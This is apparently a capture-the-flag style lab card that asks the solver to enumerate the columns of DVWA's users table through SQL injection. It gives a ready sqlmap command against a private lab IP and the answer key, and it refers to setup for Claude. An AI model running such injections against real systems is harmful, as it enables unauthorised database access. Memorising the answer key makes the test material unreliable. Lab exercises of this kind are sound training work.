# Q255 — List Columns of a Table

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟢 Easy |
| **Tools** | `sqlmap` |
| **Time budget** | 5–8 min |

---

## 📝 Question

"List all columns in the `users` table of `dvwa` database. Report column names and types."

---

## 🎯 Flag Format

```
columns=<comma_separated>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" -D dvwa -T users --columns --batch
```

**Answer:** `columns=user_id,first_name,last_name,user,password,avatar`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q255"
